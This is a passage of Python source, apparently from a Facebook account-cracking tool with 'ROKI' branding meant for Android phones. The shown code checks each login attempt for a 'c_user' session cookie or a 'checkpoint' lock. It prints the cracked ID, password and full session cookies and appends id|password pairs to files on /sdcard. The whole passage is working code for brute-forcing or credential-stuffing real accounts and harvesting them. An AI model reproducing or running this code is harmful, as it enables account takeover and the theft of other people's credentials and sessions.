                        Shahin=session.cookies.get_dict().keys()
                        if "c_user" in Shahin:
                                coki=session.cookies.get_dict()
                                cookie = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [ROKI-DONE] %s | %s'%(ids,pas))
                                print('\r\r\033[1;32m [COOKIES] %s   '%(cookie))
                                open(f'/sdcard/ROKI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\033[0;31m [ROKI-LOCK] %s | %s'%(ids,pas))
                                        open(f'/sdcard/ROKI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
menu()